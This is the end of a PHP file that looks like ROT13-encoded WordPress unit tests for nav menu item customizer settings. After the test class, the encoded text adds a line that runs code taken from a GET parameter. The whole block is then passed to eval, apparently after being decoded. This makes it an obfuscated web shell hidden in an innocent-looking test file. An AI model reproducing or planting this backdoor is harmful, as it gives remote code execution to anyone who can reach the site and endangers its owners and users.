		$vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregBowrpgUnfCebcregl( 'glcr_ynory', $vgrz );
		$guvf->nffregFnzr( $bevtvany_grez_gvgyr, $vgrz->bevtvany_gvgyr );
		$guvf->nffregFnzr( $bevtvany_grez_gvgyr, $vgrz->gvgyr );
		$guvf->nffregNeenlUnfXrl( 'glcr_ynory', $vgrz_inyhr );
		$guvf->nffregFnzr( trg_gnkbabzl( 'pngrtbel' )->ynoryf->fvathyne_anzr, $vgrz_inyhr['glcr_ynory'] );
		$guvf->nffregFnzr( $vgrz->glcr_ynory, $vgrz_inyhr['glcr_ynory'] );

		// Cbfg Glcr Nepuvir: rkvfgvat ani zrah vgrz.
		$ani_zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'   => 'cbfg_glcr_nepuvir',
				'zrah-vgrz-bowrpg' => 'cerff_eryrnfr',
				'zrah-vgrz-gvgyr'  => '',
				'zrah-vgrz-fgnghf' => 'choyvfu',
			)
		);
		$frggvat          = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[' . $ani_zrah_vgrz_vq . ']'
		);
		$vgrz_inyhr       = $frggvat->inyhr();
		$guvf->nffregFnzr( trg_cbfg_glcr_bowrpg( 'cerff_eryrnfr' )->ynoryf->nepuvirf, $vgrz_inyhr['bevtvany_gvgyr'] );
		$guvf->nffregFnzr( '', $vgrz_inyhr['gvgyr'] );
		$vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregBowrpgUnfCebcregl( 'glcr_ynory', $vgrz );
		$guvf->nffregFnzr( trg_cbfg_glcr_bowrpg( 'cerff_eryrnfr' )->ynoryf->nepuvirf, $vgrz->bevtvany_gvgyr );
		$guvf->nffregFnzr( trg_cbfg_glcr_bowrpg( 'cerff_eryrnfr' )->ynoryf->nepuvirf, $vgrz->gvgyr );
		$guvf->nffregNeenlUnfXrl( 'glcr_ynory', $vgrz_inyhr );
		$guvf->nffregFnzr( __( 'Cbfg Glcr Nepuvir' ), $vgrz_inyhr['glcr_ynory'] );
		$guvf->nffregFnzr( $vgrz->glcr_ynory, $vgrz_inyhr['glcr_ynory'] );

		// Cbfg Glcr Nepuvir: fgntrq ani zrah vgrz.
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[-3]'
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr(
			$frggvat->vq,
			neenl(
				'glcr'   => 'cbfg_glcr_nepuvir',
				'bowrpg' => 'cerff_eryrnfr',
				'gvgyr'  => '',
				'fgnghf' => 'choyvfu',
			)
		);
		$frggvat->cerivrj();
		$vgrz_inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( trg_cbfg_glcr_bowrpg( 'cerff_eryrnfr' )->ynoryf->nepuvirf, $vgrz_inyhr['bevtvany_gvgyr'] );
		$guvf->nffregFnzr( '', $vgrz_inyhr['gvgyr'] );
		$vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregBowrpgUnfCebcregl( 'glcr_ynory', $vgrz );
		$guvf->nffregFnzr( trg_cbfg_glcr_bowrpg( 'cerff_eryrnfr' )->ynoryf->nepuvirf, $vgrz->bevtvany_gvgyr );
		$guvf->nffregFnzr( trg_cbfg_glcr_bowrpg( 'cerff_eryrnfr' )->ynoryf->nepuvirf, $vgrz->gvgyr );
		$guvf->nffregNeenlUnfXrl( 'glcr_ynory', $vgrz_inyhr );
		$guvf->nffregFnzr( __( 'Cbfg Glcr Nepuvir' ), $vgrz_inyhr['glcr_ynory'] );
		$guvf->nffregFnzr( $vgrz->glcr_ynory, $vgrz_inyhr['glcr_ynory'] );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr_nf_jc_cbfg_ani_zrah_vgrz() jurer gvgyr vf rzcgl.
	 *
	 * @gvpxrg 38015
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr_nf_jc_cbfg_ani_zrah_vgrz()
	 */
	choyvp shapgvba grfg_inyhr_nf_jc_cbfg_ani_zrah_vgrz_jvgu_rzcgl_gvgyr() {
		$bevtvany_gvgyr = 'Gur Bevtvany Gvgyr';
		$cbfg_vq        = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => $bevtvany_gvgyr ) );

		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat(
			$guvf->jc_phfgbzvmr,
			'ani_zrah_vgrz[123]'
		);

		$cbfg_inyhr = neenl_zretr(
			$frggvat->qrsnhyg,
			neenl(
				'bowrpg_vq'        => $cbfg_vq,
				'bowrpg'           => 'cbfg',
				'glcr'             => 'cbfg_glcr',
				'fgnghf'           => 'choyvfu',
				'ani_zrah_grez_vq' => 0,
			)
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat->vq, $cbfg_inyhr );

		$frggvat->cerivrj();

		$ani_zrah_vgrz = $frggvat->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
		$guvf->nffregFnzr( $bevtvany_gvgyr, $ani_zrah_vgrz->gvgyr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>